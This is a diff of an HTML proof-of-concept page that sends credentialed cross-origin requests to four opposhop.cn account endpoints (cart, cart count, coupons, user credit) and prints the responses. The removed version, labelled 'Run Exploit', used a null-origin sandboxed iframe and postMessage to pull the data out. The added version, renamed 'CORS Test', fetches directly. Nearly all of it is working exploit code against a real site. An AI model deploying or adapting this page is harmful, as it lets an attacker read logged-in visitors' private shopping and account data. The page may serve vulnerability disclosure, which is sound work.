@@ -1,74 +1,69 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
+<title>CORS Test</title>
+</head>
+
 <body>
 
-<button onclick="run()">Run Exploit</button>
+<h2>CORS Test from GitHub</h2>
+
+<button onclick="run()">Run Test</button>
 
 <pre id="out"></pre>
 
 <script>
 
 const endpoints = {
+
 cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+
 count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+
 coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+
 credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
-}
+
+};
 
 function run(){
-
-let code = `
-<script>
-
-const endpoints = ${JSON.stringify(endpoints)}
 
 for (let name in endpoints){
 
 fetch(endpoints[name],{
+
 method:"GET",
+
+mode:"cors",
+
 credentials:"include"
-})
-.then(r=>r.text().then(t=>{
-parent.postMessage({
-endpoint:name,
-status:r.status,
-body:t
-},"*")
-}))
-.catch(e=>{
-parent.postMessage({
-endpoint:name,
-status:"error",
-body:e.toString()
-},"*")
+
 })
 
-}
+.then(r=>r.text())
 
-<\/script>
-`
-
-let iframe = document.createElement("iframe")
-
-iframe.sandbox = "allow-scripts"
-
-iframe.srcdoc = code
-
-iframe.style.display = "none"
-
-document.body.appendChild(iframe)
-
-}
-
-window.addEventListener("message", e => {
+.then(data=>{
 
 document.getElementById("out").textContent +=
-"\nEndpoint: " + e.data.endpoint +
-"\nStatus: " + e.data.status +
-"\nResponse: " + e.data.body +
-"\n----------------------\n"
+"\nEndpoint: "+name+
+"\nResponse: "+data+
+"\n-----------------\n";
 
 })
+
+.catch(error=>{
+
+document.getElementById("out").textContent +=
+"\nEndpoint: "+name+
+"\nError: "+error+
+"\n-----------------\n";
+
+});
+
+}
+
+}
 
 </script>
 
